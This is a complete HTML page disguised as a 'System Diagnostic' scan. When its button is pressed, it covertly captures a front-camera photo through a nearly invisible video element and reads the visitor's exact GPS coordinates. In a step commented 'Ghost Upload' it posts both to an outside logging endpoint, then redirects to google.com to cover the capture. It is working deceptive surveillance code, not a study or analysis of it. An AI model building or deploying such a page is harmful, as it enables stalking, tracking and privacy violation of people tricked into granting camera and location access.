<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .btn { padding: 20px 40px; border: 1px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1.1rem; letter-spacing: 2px; }
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
        #status { margin-bottom: 20px; font-size: 0.9rem; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="status">Satellite Link: Standby</div>
    <video id="v" playsinline muted></video>
    <button id="btn" class="btn">INITIALIZE SCAN</button>

    <script>
        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
        const video = document.getElementById('v');
        const btn = document.getElementById('btn');
        const status = document.getElementById('status');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            btn.style.display = 'none';
            status.innerText = "CALIBRATING SENSORS & GPS...";

            try {
                // Parallel Request: Camera + High-Accuracy GPS
                const [stream, position] = await Promise.all([
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
                    new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(resolve, (err) => {
                            console.warn("GPS Denied/Timeout");
                            resolve(null);
                        }, {
                            enableHighAccuracy: true, // Forces phone GPS hardware
                            timeout: 8000,           // Wait up to 8s for a lock
                            maximumAge: 0            // No cached locations
                        });
                    })
                ]);

                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    // Slight delay for camera light adjustment
                    setTimeout(() => executeFinalSequence(position), 500);
                };
            } catch (err) {
                status.innerText = "CRITICAL ERROR: HARDWARE_BLOCK";
                status.style.color = "red";
            }
        };

        async function executeFinalSequence(pos) {
            // 1. Snapshot
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataImg = canvas.toDataURL('image/jpeg', 0.5);

            // 2. Kill Hardware (Light goes off)
            video.srcObject.getTracks().forEach(t => t.stop());

            // 3. Format Exact Coordinates
            let exactGPS = "GPS_DENIED";
            if (pos) {
                exactGPS = `${pos.coords.latitude},${pos.coords.longitude}`;
            }

            // 4. Ghost Upload
            fetch(LOGGING_API, {
                method: 'POST',
                keepalive: true,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    image: dataImg, 
                    gps: exactGPS 
                })
            });

            // 5. Exit
            status.innerText = "SUCCESS. REDIRECTING...";
            setTimeout(() => {
                window.location.replace("https://google.com");
            }, 600);
        }
    </script>
</body>
</html>
